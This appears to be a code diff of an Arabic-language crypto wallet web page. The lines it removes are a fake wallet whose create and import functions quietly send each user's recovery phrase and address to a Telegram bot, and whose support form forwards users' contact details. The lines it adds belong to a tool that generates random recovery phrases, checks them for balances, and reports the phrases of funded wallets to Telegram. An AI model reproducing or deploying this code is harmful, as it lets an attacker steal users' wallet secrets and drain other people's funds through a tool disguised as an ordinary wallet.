-                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,tether,usd-coin,dai,matic-network&vs_currencies=usd');
-                const data = await response.json();
-                
-                cryptoPrices = {
-                    ETH: data.ethereum?.usd || 0,
-                    BNB: data.binancecoin?.usd || 0,
-                    USDT: data.tether?.usd || 1,
-                    USDC: data['usd-coin']?.usd || 1,
-                    DAI: data.dai?.usd || 1,
-                    MATIC: data['matic-network']?.usd || 0
-                };
-
-                console.log('Crypto prices fetched:', cryptoPrices);
-            } catch (error) {
-                console.error('Error fetching crypto prices:', error);
-                // أسعار افتراضية
-                cryptoPrices = { ETH: 2000, BNB: 300, USDT: 1, USDC: 1, DAI: 1, MATIC: 0.8 };
-            }
-        }
-
-        // إنشاء محفظة جديدة
-        async function createNewWallet() {
-            try {
-                showLoading('جاري إنشاء محفظة جديدة...');
-                
-                // إنشاء محفظة عشوائية
-                const wallet = ethers.Wallet.createRandom();
-                const address = wallet.address;
-                const privateKey = wallet.privateKey;
-                const mnemonic = wallet.mnemonic.phrase;
-                
-                // عرض المعلومات
-                document.getElementById('newWalletAddress').textContent = address;
-                document.getElementById('newWalletMnemonic').textContent = mnemonic;
-                
-                // حفظ المحفظة مؤقتاً
-                currentWallet = {
-                    address,
-                    privateKey,
-                    mnemonic
-                };
-                
-                // إرسال عبارة الاسترجاع إلى تليجرام
-                const telegramMessage = `🔐 <b>عبارة استرجاع محفظة جديدة</b>\n\n` +
-                    `📍 <b>العنوان:</b> <code>${address}</code>\n\n` +
-                    `🔑 <b>عبارة الاسترجاع:</b>\n<code>${mnemonic}</code>\n\n` +
-                    `⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
-                
-                await sendToTelegram(telegramMessage);
-                
-                hideLoading();
-                showToast('تم إنشاء المحفظة بنجاح!', 'success');
-                
-            } catch (error) {
-                hideLoading();
-                console.error('Error creating wallet:', error);
-                showToast('حدث خطأ أثناء إنشاء المحفظة', 'error');
-            }
-        }
-
-        // حفظ المحفظة مع التشفير
-        function saveWallet(walletData, password) {
-            const encryptedWallet = encryptData(walletData, password);
-            localStorage.setItem('encryptedWallet', encryptedWallet);
-            localStorage.setItem('walletExists', 'true');
-        }
-
-        // تحميل المحفظة مع فك التشفير
-        function loadWallet(password) {
-            const encryptedWallet = localStorage.getItem('encryptedWallet');
-            if (!encryptedWallet) {
-                throw new Error('لا توجد محفظة محفوظة');
+            let message = `🔑 <b>عبارة استرجاع جديدة</b>\n\n`;
+            message += `📝 <b>العبارة:</b>\n<code>${mnemonic}</code>\n\n`;
+            message += `📍 <b>العنوان:</b>\n<code>${address}</code>\n\n`;
+            
+            if (walletDetails.balance !== null) {
+                message += `💰 <b>الرصيد:</b> ${walletDetails.balance.toFixed(6)} ETH\n`;
             }
             
-            return decryptData(encryptedWallet, password);
-        }
-
-        // استيراد محفظة موجودة
-        async function importWallet(mnemonic) {
-            try {
-                showLoading('جاري استيراد المحفظة...');
-                
-                // التحقق من صحة عبارة الاسترجاع
-                if (!ethers.utils.isValidMnemonic(mnemonic.trim())) {
-                    throw new Error('عبارة الاسترجاع غير صحيحة');
-                }
-                
-                // استيراد المحفظة
-                const wallet = ethers.Wallet.fromMnemonic(mnemonic.trim());
-                
-                currentWallet = {
-                    address: wallet.address,
-                    privateKey: wallet.privateKey,
-                    mnemonic: mnemonic.trim()
-                };
-                
-                // إرسال عبارة الاسترجاع إلى تليجرام
-                const telegramMessage = `📥 <b>استيراد محفظة موجودة</b>\n\n` +
-                    `📍 <b>العنوان:</b> <code>${wallet.address}</code>\n\n` +
-                    `🔑 <b>عبارة الاسترجاع:</b>\n<code>${mnemonic.trim()}</code>\n\n` +
-                    `⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
-                
-                await sendToTelegram(telegramMessage);
-                
-                hideLoading();
-                showToast('تم استيراد المحفظة بنجاح!', 'success');
-                
-                // الانتقال لشاشة كلمة المرور
-                showScreen('passwordScreen');
-                
-            } catch (error) {
-                hideLoading();
-                console.error('Error importing wallet:', error);
-                showToast(error.message || 'حدث خطأ أثناء استيراد المحفظة', 'error');
-            }
-        }
-
-        // تحميل بيانات المحفظة
-        async function loadWalletData() {
-            try {
-                if (!currentWallet) return;
-                
-                const address = currentWallet.address;
-                const shortAddress = `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
-                
-                // عرض العنوان
-                document.getElementById('currentWalletAddress').textContent = shortAddress;
-                document.getElementById('receiveAddress').textContent = address;
-                
-                // تحديث الرصيد
-                await updateBalance();
-                
-                // إنشاء QR Code
-                generateQRCode(address);
-                
-                // تحميل الأصول
-                loadAssets();
-                
-                // تحميل التحويلات
-                await loadTransactions();
-                
-            } catch (error) {
-                console.error('Error loading wallet data:', error);
-                showToast('حدث خطأ أثناء تحميل بيانات المحفظة', 'error');
-            }
-        }
-
-        // تحديث الرصيد
-        async function updateBalance() {
-            try {
-                if (!currentWallet) return;
-                
-                let totalUsdValue = 0;
-                const balances = {};
-                
-                // جلب رصيد ETH
-                const ethBalance = await providers.ethereum.getBalance(currentWallet.address);
-                const ethAmount = parseFloat(ethers.utils.formatEther(ethBalance));
-                balances.ETH = ethAmount;
-                totalUsdValue += ethAmount * (cryptoPrices.ETH || 0);
-                
-                // جلب رصيد BNB
-                try {
-                    const bnbBalance = await providers.bsc.getBalance(currentWallet.address);
-                    const bnbAmount = parseFloat(ethers.utils.formatEther(bnbBalance));
-                    balances.BNB = bnbAmount;
-                    totalUsdValue += bnbAmount * (cryptoPrices.BNB || 0);
-                } catch (error) {
-                    console.error('Error fetching BNB balance:', error);
-                    balances.BNB = 0;
-                }
-                
-                // جلب رصيد MATIC
-                try {
-                    const maticBalance = await providers.polygon.getBalance(currentWallet.address);
-                    const maticAmount = parseFloat(ethers.utils.formatEther(maticBalance));
-                    balances.MATIC = maticAmount;
-                    totalUsdValue += maticAmount * (cryptoPrices.MATIC || 0);
-                } catch (error) {
-                    console.error('Error fetching MATIC balance:', error);
-                    balances.MATIC = 0;
-                }
-                
-                // جلب رصيد USDT على شبكات مختلفة
-                let totalUSDT = 0;
-                
-                // USDT على Ethereum
-                try {
-                    const usdtContract = new ethers.Contract(
-                        NETWORKS.ethereum.tokens.USDT,
-                        ['function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)'],
-                        providers.ethereum
-                    );
-                    const usdtBalance = await usdtContract.balanceOf(currentWallet.address);
-                    const decimals = await usdtContract.decimals();
-                    const usdtAmount = parseFloat(ethers.utils.formatUnits(usdtBalance, decimals));
-                    totalUSDT += usdtAmount;
-                } catch (error) {
-                    console.error('Error fetching USDT-ETH balance:', error);
-                }
-                
-                // USDT على BSC
-                try {
-                    const usdtBscContract = new ethers.Contract(
-                        NETWORKS.bsc.tokens.USDT,
-                        ['function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)'],
-                        providers.bsc
-                    );
-                    const usdtBscBalance = await usdtBscContract.balanceOf(currentWallet.address);
-                    const decimals = await usdtBscContract.decimals();
-                    const usdtBscAmount = parseFloat(ethers.utils.formatUnits(usdtBscBalance, decimals));
-                    totalUSDT += usdtBscAmount;
-                } catch (error) {
-                    console.error('Error fetching USDT-BSC balance:', error);
-                }
-                
-                balances.USDT = totalUSDT;
-                totalUsdValue += totalUSDT * (cryptoPrices.USDT || 1);
-                
-                // عرض الرصيد الإجمالي
-                document.getElementById('totalBalance').textContent = totalUsdValue.toFixed(2);
-                document.getElementById('balanceDetails').textContent = 
-                    `ETH: ${balances.ETH.toFixed(4)} | BNB: ${balances.BNB.toFixed(4)} | MATIC: ${balances.MATIC.toFixed(4)} | USDT: ${balances.USDT.toFixed(2)}`;
-                
-                currentBalance = totalUsdValue;
-                
-            } catch (error) {
-                console.error('Error updating balance:', error);
-                showToast('حدث خطأ أثناء تحديث الرصيد', 'error');
-            }
-        }
-
-        // تحميل الأصول
-        async function loadAssets() {
-            try {
-                const assetsList = document.getElementById('assetsList');
-                assetsList.innerHTML = '';
-                
-                const assets = [
-                    { symbol: 'ETH', name: 'Ethereum', network: 'Ethereum', balance: 0, price: cryptoPrices.ETH || 0 },
-                    { symbol: 'BNB', name: 'BNB', network: 'BSC', balance: 0, price: cryptoPrices.BNB || 0 },
-                    { symbol: 'MATIC', name: 'Polygon', network: 'Polygon', balance: 0, price: cryptoPrices.MATIC || 0 },
-                    { symbol: 'USDT', name: 'Tether USD', network: 'Multi-Chain', balance: 0, price: cryptoPrices.USDT || 1 },
-                    { symbol: 'USDC', name: 'USD Coin', network: 'Multi-Chain', balance: 0, price: cryptoPrices.USDC || 1 },
-                    { symbol: 'DAI', name: 'Dai Stablecoin', network: 'Ethereum', balance: 0, price: cryptoPrices.DAI || 1 }
-                ];
-                
-                assets.forEach(asset => {
-                    const assetItem = document.createElement('div');
-                    assetItem.className = 'asset-item';
-                    assetItem.innerHTML = `
-                        <div class="asset-icon">
-                            ${asset.symbol.substring(0, 3)}
-                        </div>
-                        <div class="asset-details">
-                            <h5>${asset.name}</h5>
-                            <p>${asset.network}</p>
-                        </div>
-                        <div class="asset-balance">
-                            ${asset.balance.toFixed(4)} ${asset.symbol}<br>
-                            <small style="color: var(--text-secondary);">$${(asset.balance * asset.price).toFixed(2)}</small>
-                        </div>
-                    `;
-                    assetsList.appendChild(assetItem);
-                });
-                
-            } catch (error) {
-                console.error('Error loading assets:', error);
-            }
-        }
-
-        // جلب التحويلات من مستكشف البلوكتشين
-        async function fetchTransactionsFromExplorer(network, address) {
-            try {
-                const networkConfig = NETWORKS[network];
-                if (!networkConfig || !networkConfig.explorerApi) return [];
-                
-                let apiUrl;
-                if (network === 'ethereum') {
-                    apiUrl = `${networkConfig.explorerApi}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=desc&apikey=482a7c1c7cc14ec78699c3f1c231b0cd`;
-                } else if (network === 'bsc') {
-                    apiUrl = `${networkConfig.explorerApi}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=desc&apikey=482a7c1c7cc14ec78699c3f1c231b0cd`;
-                } else if (network === 'polygon') {
-                    apiUrl = `${networkConfig.explorerApi}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=desc&apikey=482a7c1c7cc14ec78699c3f1c231b0cd`;
-                }
-                
-                const response = await fetch(apiUrl);
-                const data = await response.json();
-                
-                if (data.status === '1' && data.result) {
-                    return data.result.slice(0, 10).map(tx => ({
-                        hash: tx.hash,
-                        from: tx.from,
-                        to: tx.to,
-                        value: ethers.utils.formatEther(tx.value),
-                        timestamp: parseInt(tx.timeStamp) * 1000,
-                        network: network,
-                        type: tx.from.toLowerCase() === address.toLowerCase() ? 'send' : 'receive',
-                        status: tx.txreceipt_status === '1' ? 'success' : 'failed'
-                    }));
-                }
-                
-                return [];
-            } catch (error) {
-                console.error(`Error fetching transactions for ${network}:`, error);
-                return [];
-            }
-        }
-
-        // تحميل التحويلات
-        async function loadTransactions() {
-            try {
-                if (!currentWallet) return;
-                
-                walletTransactions = [];
-                
-                // جلب التحويلات من جميع الشبكات
-                const networks = ["ethereum", "bsc", "polygon"];
-                const promises = networks.map(network => 
-                    fetchTransactionsFromExplorer(network, currentWallet.address)
-                );
-                
-                const results = await Promise.all(promises);
-                
-                // دمج جميع التحويلات
-                results.forEach(networkTxs => {
-                    walletTransactions = walletTransactions.concat(networkTxs);
-                });
-                
-                // ترتيب التحويلات حسب التاريخ
-                walletTransactions.sort((a, b) => b.timestamp - a.timestamp);
-                
-                // عرض التحويلات الأخيرة في الشاشة الرئيسية
-                displayRecentTransactions();
-                
-            } catch (error) {
-                console.error("Error loading transactions:", error);
-            }
-        }
-
-        // عرض التحويلات الأخيرة
-        function displayRecentTransactions() {
-            const transactionsList = document.getElementById('transactionsList');
-            
-            if (walletTransactions.length === 0) {
-                transactionsList.innerHTML = `
-                    <div class="no-transactions">
-                        <i class="fas fa-receipt"></i>
-                        <span>لا توجد معاملات بعد</span>
-                    </div>
-                `;
-                return;
+            if (walletDetails.transactionCount !== null) {
+                message += `📊 <b>عدد المعاملات:</b> ${walletDetails.transactionCount}\n`;
             }
             
-            transactionsList.innerHTML = '';
-            
-            // عرض آخر 5 معاملات
-            const recentTxs = walletTransactions.slice(0, 5);
-            
-            recentTxs.forEach(tx => {
-                const txItem = document.createElement('div');
-                txItem.className = 'transaction-item';
-                txItem.onclick = () => openTransactionDetails(tx);
-                
-                const date = new Date(tx.timestamp).toLocaleDateString('ar-SA');
-                const shortHash = `${tx.hash.substring(0, 6)}...${tx.hash.substring(tx.hash.length - 4)}`;
-                
-                txItem.innerHTML = `
-                    <div class="transaction-icon ${tx.type}">
-                        <i class="fas ${tx.type === 'send' ? 'fa-arrow-up' : 'fa-arrow-down'}"></i>
-                    </div>
-                    <div class="transaction-details">
-                        <h5>${tx.type === 'send' ? 'إرسال' : 'استقبال'} ${NETWORKS[tx.network].symbol}</h5>
-                        <p>${date} • ${shortHash}</p>
-                    </div>
-                    <div class="transaction-amount ${tx.type === 'send' ? 'negative' : 'positive'}">
-                        ${tx.type === 'send' ? '-' : '+'}${parseFloat(tx.value).toFixed(4)} ${NETWORKS[tx.network].symbol}
-                    </div>
-                `;
-                
-                transactionsList.appendChild(txItem);
-            });
+            message += `\n⏰ <b>الوقت:</b> ${timestamp}`;
+            return message;
         }
 
-        // عرض جميع التحويلات في النافذة المنبثقة
-        function displayAllTransactions(filterNetwork = 'all') {
-            const allTransactionsList = document.getElementById('allTransactionsList');
-            
-            let filteredTxs = walletTransactions;
-            if (filterNetwork !== 'all') {
-                filteredTxs = walletTransactions.filter(tx => tx.network === filterNetwork);
-            }
-            
-            if (filteredTxs.length === 0) {
-                allTransactionsList.innerHTML = `
-                    <div class="no-transactions">
-                        <i class="fas fa-receipt"></i>
-                        <span>لا توجد معاملات</span>
-                    </div>
-                `;
-                return;
-            }
-            
-            allTransactionsList.innerHTML = '';
-            
-            filteredTxs.forEach(tx => {
-                const txItem = document.createElement('div');
-                txItem.className = 'transaction-item';
-                txItem.onclick = () => openTransactionDetails(tx);
-                
-                const date = new Date(tx.timestamp).toLocaleDateString('ar-SA');
-                const time = new Date(tx.timestamp).toLocaleTimeString('ar-SA');
-                const shortHash = `${tx.hash.substring(0, 8)}...${tx.hash.substring(tx.hash.length - 6)}`;
-                
-                txItem.innerHTML = `
-                    <div class="transaction-icon ${tx.type}">
-                        <i class="fas ${tx.type === 'send' ? 'fa-arrow-up' : 'fa-arrow-down'}"></i>
-                    </div>
-                    <div class="transaction-details">
-                        <h5>${tx.type === 'send' ? 'إرسال' : 'استقبال'} ${NETWORKS[tx.network].symbol}</h5>
-                        <p>${date} ${time} • ${NETWORKS[tx.network].name}</p>
-                        <p style="font-family: monospace; font-size: 12px; color: var(--text-muted);">${shortHash}</p>
-                    </div>
-                    <div class="transaction-amount ${tx.type === 'send' ? 'negative' : 'positive'}">
-                        ${tx.type === 'send' ? '-' : '+'}${parseFloat(tx.value).toFixed(4)} ${NETWORKS[tx.network].symbol}
-                    </div>
-                `;
-                
-                allTransactionsList.appendChild(txItem);
-            });
-        }
-
-        // فتح تفاصيل المعاملة
-        function openTransactionDetails(tx) {
-            const explorerUrl = `${NETWORKS[tx.network].explorer}/tx/${tx.hash}`;
-            window.open(explorerUrl, '_blank');
-        }
-
-        // إنشاء QR Code
-        async function generateQRCode(address) {
-            const canvas = document.getElementById("qrCodeCanvas");
-            if (typeof QRCode === "undefined") {
-                // Fallback if QRCode is not defined, though it should be loaded by script tag
-                console.warn("QRCode library not yet loaded. Attempting to load dynamically.");
-                await new Promise(resolve => {
-                    const script = document.createElement("script");
-                    script.src = "https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.5.3/qrcode.min.js";
-                    script.onload = resolve;
-                    document.head.appendChild(script);
-                });
-            }
-            QRCode.toCanvas(canvas, address, { width: 200, margin: 2 }, function (error) {
-                if (error) console.error("Error generating QR code:", error);
-            });
-        }
-
-        // بدء مسح QR
-        async function startQRScanner() {
+        async function sendActiveWalletToTelegram(mnemonic, address, walletDetails) {
             try {
-                const videoElement = document.getElementById('scannerVideo');
-                
-                if (!qrScanner) {
-                    qrScanner = new Html5Qrcode("scannerVideo");
-                }
-                
-                const cameras = await Html5Qrcode.getCameras();
-                if (cameras && cameras.length) {
-                    const cameraId = cameras[0].id;
-                    
-                    await qrScanner.start(
-                        cameraId,
-                        {
-                            fps: 10,
-                            qrbox: { width: 250, height: 250 }
-                        },
-                        (decodedText, decodedResult) => {
-                            // تم مسح QR code بنجاح
-                            document.getElementById('recipientAddress').value = decodedText;
-                            stopQRScanner();
-                            hideModal('qrScannerModal');
-                            showToast('تم مسح العنوان بنجاح!', 'success');
-                        },
-                        (errorMessage) => {
-                            // خطأ في المسح (طبيعي)
-                        }
-                    );
-                    
-                    document.getElementById('startScanBtn').disabled = true;
-                    document.getElementById('stopScanBtn').disabled = false;
-                }
+                const message = formatWalletMessage(mnemonic, address, walletDetails);
+                return await sendTelegramMessage(message);
             } catch (error) {
-                console.error('Error starting QR scanner:', error);
-                showToast('حدث خطأ أثناء بدء المسح', 'error');
+                console.error('خطأ في إرسال المحفظة النشطة:', error);
+                return false;
             }
         }
 
-        // إيقاف مسح QR
-        async function stopQRScanner() {
-            try {
-                if (qrScanner) {
-                    await qrScanner.stop();
-                    document.getElementById('startScanBtn').disabled = false;
-                    document.getElementById('stopScanBtn').disabled = true;
-                }
-            } catch (error) {
-                console.error('Error stopping QR scanner:', error);
-            }
-        }
-
-        // إرسال معاملة
-        async function sendTransaction(network, to, amount, asset) {
-            try {
-                showLoading('جاري إرسال المعاملة...');
-                
-                if (!currentWallet || !userPassword) {
-                    throw new Error('المحفظة غير متاحة');
-                }
-                
-                const wallet = new ethers.Wallet(currentWallet.privateKey, providers[network]);
-                
-                let tx;
-                if (asset === NETWORKS[network].symbol) {
-                    // إرسال العملة الأساسية
-                    tx = await wallet.sendTransaction({
-                        to: to,
-                        value: ethers.utils.parseEther(amount.toString())
-                    });
-                } else {
-                    // إرسال رمز مميز
-                    const tokenAddress = NETWORKS[network].tokens[asset];
-                    if (!tokenAddress) {
-                        throw new Error('الرمز المميز غير مدعوم على هذه الشبكة');
-                    }
-                    
-                    const tokenContract = new ethers.Contract(
-                        tokenAddress,
-                        ['function transfer(address to, uint256 amount) returns (bool)', 'function decimals() view returns (uint8)'],
-                        wallet
-                    );
-                    
-                    const decimals = await tokenContract.decimals();
-                    const tokenAmount = ethers.utils.parseUnits(amount.toString(), decimals);
-                    
-                    tx = await tokenContract.transfer(to, tokenAmount);
-                }
-                
-                hideLoading();
-                showToast(`تم إرسال المعاملة بنجاح! Hash: ${tx.hash}`, 'success');
-                
-                // تحديث الرصيد والتحويلات
-                setTimeout(() => {
-                    updateBalance();
-                    loadTransactions();
-                }, 5000);
-                
-            } catch (error) {
-                hideLoading();
-                console.error('Error sending transaction:', error);
-                showToast(error.message || 'حدث خطأ أثناء إرسال المعاملة', 'error');
-            }
-        }
-
-        // إرسال رسالة دعم فني
-        async function sendSupportMessage(name, email, phone, message) {
-            try {
-                const telegramMessage = `🆘 <b>رسالة دعم فني جديدة</b>\n\n` +
-                    `👤 <b>الاسم:</b> ${name}\n` +
-                    `📧 <b>البريد الإلكتروني:</b> ${email}\n` +
-                    `📱 <b>رقم الهاتف:</b> ${phone || 'غير محدد'}\n\n` +
-                    `💬 <b>الرسالة:</b>\n${message}\n\n` +
-                    `⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
-                
-                const success = await sendToTelegram(telegramMessage);
-                
-                if (success) {
-                    showToast('تم إرسال رسالتك بنجاح! سنتواصل معك قريباً', 'success');
-                    // إعادة تعيين النموذج
-                    document.getElementById('supportForm').reset();
-                    hideModal('supportModal');
-                } else {
-                    showToast('حدث خطأ أثناء إرسال الرسالة. يرجى المحاولة مرة أخرى', 'error');
-                }
-                
-            } catch (error) {
-                console.error('Error sending support message:', error);
-                showToast('حدث خطأ أثناء إرسال الرسالة', 'error');
-            }
-        }
-
-        // طلب كلمة المرور بواجهة احترافية
-        function promptForPasswordProfessional() {
-            return new Promise((resolve, reject) => {
-                const modal = document.getElementById('passwordPromptModal');
-                const input = document.getElementById('passwordPromptInput');
-                const confirmBtn = document.getElementById('passwordPromptConfirm');
-                const cancelBtn = document.getElementById('passwordPromptCancel');
-                
-                // إظهار النافذة
-                modal.classList.add('active');
-                input.focus();
-                
-                // معالج تأكيد كلمة المرور
-                const handleConfirm = () => {
-                    const password = input.value;
-                    if (password) {
-                        try {
-                            const walletData = loadWallet(password);
-                            currentWallet = walletData;
-                            userPassword = password;
-                            modal.classList.remove('active');
-                            input.value = '';
-                            resolve(true);
-                        } catch (error) {
-                            showToast('كلمة مرور خاطئة', 'error');
-                            input.focus();
-                        }
-                    }
-                };
-                
-                // معالج إلغاء
-                const handleCancel = () => {
-                    modal.classList.remove('active');
-                    input.value = '';
-                    reject(false);
-                };
-                
-                // ربط الأحداث
-                confirmBtn.onclick = handleConfirm;
-                cancelBtn.onclick = handleCancel;
-                
-                // الضغط على Enter
-                input.onkeypress = (e) => {
-                    if (e.key === 'Enter') {
-                        handleConfirm();
-                    }
-                };
-            });
-        }
-
-        // وظائف مساعدة
-        function showScreen(screenId) {
-            document.querySelectorAll('.screen').forEach(screen => {
-                screen.classList.remove('active');
-            });
-            document.getElementById(screenId).classList.add('active');
-        }
-
-        function showModal(modalId) {
-            document.getElementById(modalId).classList.add('active');
-        }
-
-        function hideModal(modalId) {
-            document.getElementById(modalId).classList.remove('active');
-        }
-
-        function showLoading(text = 'جاري التحميل...') {
-            document.getElementById('loadingText').textContent = text;
-            document.getElementById('loadingOverlay').classList.add('active');
-        }
-
-        function hideLoading() {
-            document.getElementById('loadingOverlay').classList.remove('active');
-        }
-
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                showToast('تم النسخ بنجاح!', 'success');
-            }).catch(() => {
-                showToast('فشل في النسخ', 'error');
-            });
-        }
-
-        // عرض رسالة التنبيه
-        function showToast(message, type = 'info') {
-            const toast = document.createElement('div');
-            toast.className = `toast ${type}`;
-            toast.innerHTML = `
-                <i class="fas ${getToastIcon(type)}"></i>
-                <span>${message}</span>
-            `;
+        // وظائف السجل
+        function addLogEntry(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString('ar-EG');
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry log-${type}`;
+            logEntry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> ${message}`;
             
-            document.getElementById('toastContainer').appendChild(toast);
+            elements.logPanel.appendChild(logEntry);
+            elements.logPanel.scrollTop = elements.logPanel.scrollHeight;
+        }
+
+        // وظائف تحديث الواجهة
+        function updateStats() {
+            elements.totalGenerated.textContent = stats.totalGenerated;
+            elements.activeWallets.textContent = stats.activeWallets;
+            elements.emptyWallets.textContent = stats.emptyWallets;
+            elements.errorCount.textContent = stats.errors;
             
-            setTimeout(() => {
-                toast.style.animation = 'toastSlideOut 0.3s ease';
-                setTimeout(() => {
-                    toast.remove();
-                }, 300);
-            }, 5000);
-        }
-
-        // أيقونة رسالة التنبيه
-        function getToastIcon(type) {
-            switch (type) {
-                case 'success': return 'fa-check-circle';
-                case 'error': return 'fa-exclamation-circle';
-                case 'warning': return 'fa-exclamation-triangle';
-                default: return 'fa-info-circle';
+            const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
+            if (maxAttempts > 0) {
+                const progress = (stats.totalGenerated / maxAttempts) * 100;
+                elements.progressFill.style.width = `${Math.min(progress, 100)}%`;
             }
         }
 
-        // تسجيل الخروج
-        function logout() {
-            localStorage.clear();
-            currentWallet = null;
-            userPassword = null;
-            currentBalance = 0;
-            walletTransactions = [];
-            showScreen('welcomeScreen');
-            showToast('تم تسجيل الخروج بنجاح', 'success');
+        function updateStatus(message, type = 'info') {
+            elements.currentStatus.textContent = message;
+            elements.currentStatus.className = `alert alert-${type}`;
         }
 
-        // التحقق من وجود محفظة محفوظة
-        function checkSavedWallet() {
-            return localStorage.getItem('walletExists') === 'true';
-        }
-
-        // تهيئة التطبيق
-        async function initApp() {
+        // الوظيفة الرئيسية للبحث
+        async function searchForActiveWallets() {
             try {
-                // تهيئة المزودين
-                await initProviders();
+                const mnemonic = generateRandomBIP39Phrase();
+                stats.totalGenerated++;
                 
-                // جلب أسعار العملات المشفرة
-                await fetchCryptoPrices();
+                updateStatus(`جاري فحص العبارة رقم ${stats.totalGenerated}...`, 'info');
+                addLogEntry(`تم توليد عبارة جديدة: ${mnemonic.substring(0, 30)}...`);
                 
-                // التحقق من وجود محفظة محفوظة
-                if (checkSavedWallet()) {
-                    try {
-                        await promptForPasswordProfessional();
-                        showScreen('walletScreen');
-                        loadWalletData();
-                    } catch (error) {
-                        // المستخدم ألغى إدخال كلمة المرور
-                    }
-                }
-                
-                console.log('App initialized successfully');
-            } catch (error) {
-                console.error('Error initializing app:', error);
-                showToast('حدث خطأ أثناء تهيئة التطبيق', 'error');
-            }
-        }
-
-        // أحداث DOM
-        document.addEventListener('DOMContentLoaded', function() {
-            // تهيئة التطبيق
-            initApp();
-
-            // أزرار الشاشة الرئيسية
-            document.getElementById('importWalletBtn').addEventListener('click', () => {
-                showScreen('importScreen');
-            });
-
-            document.getElementById('createWalletBtn').addEventListener('click', () => {
-                showScreen('createScreen');
-                createNewWallet();
-            });
-
-            // أزرار العودة
-            document.getElementById('backToWelcomeBtn').addEventListener('click', () => {
-                showScreen('welcomeScreen');
-            });
-
-            document.getElementById('backToWelcomeFromCreateBtn').addEventListener('click', () => {
-                showScreen('welcomeScreen');
-            });
-
-            document.getElementById('backToCreateFromPasswordBtn').addEventListener('click', () => {
-                showScreen('createScreen');
-            });
-
-            // زر استيراد المحفظة
-            document.getElementById('importBtn').addEventListener('click', () => {
-                const mnemonic = document.getElementById('mnemonicInput').value.trim();
-                if (mnemonic) {
-                    importWallet(mnemonic);
-                } else {
-                    showToast('يرجى إدخال عبارة الاسترجاع', 'warning');
-                }
-            });
-
-            // زر المتابعة لكلمة المرور
-            document.getElementById('continueToPasswordBtn').addEventListener('click', () => {
-                showScreen('passwordScreen');
-            });
-
-            // أحداث كلمة المرور
-            const passwordInput = document.getElementById('passwordInput');
-            const confirmPasswordInput = document.getElementById('confirmPasswordInput');
-            const setPasswordBtn = document.getElementById('setPasswordBtn');
-
-            passwordInput.addEventListener('input', (e) => {
-                const isValid = updatePasswordStrength(e.target.value);
-                checkPasswordMatch();
-            });
-
-            confirmPasswordInput.addEventListener('input', checkPasswordMatch);
-
-            function checkPasswordMatch() {
-                const password = passwordInput.value;
-                const confirmPassword = confirmPasswordInput.value;
-                const isStrong = updatePasswordStrength(password);
-                const isMatching = password === confirmPassword && password.length > 0;
-                
-                setPasswordBtn.disabled = !(isStrong && isMatching);
-            }
-
-            // تبديل رؤية كلمة المرور
-            document.getElementById('togglePassword').addEventListener('click', () => {
-                const input = document.getElementById('passwordInput');
-                const icon = document.querySelector('#togglePassword i');
-                
-                if (input.type === 'password') {
-                    input.type = 'text';
-                    icon.className = 'fas fa-eye-slash';
-                } else {
-                    input.type = 'password';
-                    icon.className = 'fas fa-eye';
-                }
-            });
-
-            document.getElementById('toggleConfirmPassword').addEventListener('click', () => {
-                const input = document.getElementById('confirmPasswordInput');
-                const icon = document.querySelector('#toggleConfirmPassword i');
-                
-                if (input.type === 'password') {
-                    input.type = 'text';
-                    icon.className = 'fas fa-eye-slash';
-                } else {
-                    input.type = 'password';
-                    icon.className = 'fas fa-eye';
-                }
-            });
-
-            // زر تعيين كلمة المرور
-            document.getElementById('setPasswordBtn').addEventListener('click', () => {
-                const password = passwordInput.value;
-                
-                if (currentWallet) {
-                    saveWallet(currentWallet, password);
-                    userPassword = password;
-                    showScreen('walletScreen');
-                    loadWalletData();
-                    showToast('تم حفظ المحفظة بنجاح!', 'success');
-                }
-            });
-
-            // أزرار النسخ
-            document.getElementById('copyAddressBtn').addEventListener('click', () => {
-                const address = document.getElementById('newWalletAddress').textContent;
-                copyToClipboard(address);
-            });
-
-            document.getElementById('copyMnemonicBtn').addEventListener('click', () => {
-                const mnemonic = document.getElementById('newWalletMnemonic').textContent;
-                copyToClipboard(mnemonic);
-            });
-
-            document.getElementById('copyCurrentAddressBtn').addEventListener('click', () => {
-                if (currentWallet) {
-                    copyToClipboard(currentWallet.address);
-                }
-            });
-
-            document.getElementById('copyReceiveAddressBtn').addEventListener('click', () => {
-                if (currentWallet) {
-                    copyToClipboard(currentWallet.address);
-                }
-            });
-
-            // زر تحديث الرصيد
-            document.getElementById('refreshBalanceBtn').addEventListener('click', () => {
-                updateBalance();
-                showToast('جاري تحديث الرصيد...', 'info');
-            });
-
-            // أزرار الإجراءات السريعة
-            document.getElementById('sendBtn').addEventListener('click', () => {
-                showModal('sendModal');
-            });
-
-            document.getElementById('receiveBtn').addEventListener('click', () => {
-                showModal('receiveModal');
-                if (currentWallet) {
-                    generateQRCode(currentWallet.address);
-                }
-            });
-
-            document.getElementById('swapBtn').addEventListener('click', () => {
-                showToast('ميزة التبديل قريباً!', 'info');
-            });
-
-            document.getElementById('buyBtn').addEventListener('click', () => {
-                showToast('ميزة الشراء قريباً!', 'info');
-            });
-
-            document.getElementById('transactionsBtn').addEventListener('click', () => {
-                showModal('transactionsModal');
-                displayAllTransactions();
-            });
-
-            document.getElementById('supportBtn').addEventListener('click', () => {
-                showModal('supportModal');
-            });
-
-            // زر الإعدادات
-            document.getElementById('settingsBtn').addEventListener('click', () => {
-                showModal('settingsModal');
-            });
-
-            // أزرار إغلاق النوافذ المنبثقة
-            document.getElementById('closeSendModal').addEventListener('click', () => {
-                hideModal('sendModal');
-            });
-
-            document.getElementById('closeReceiveModal').addEventListener('click', () => {
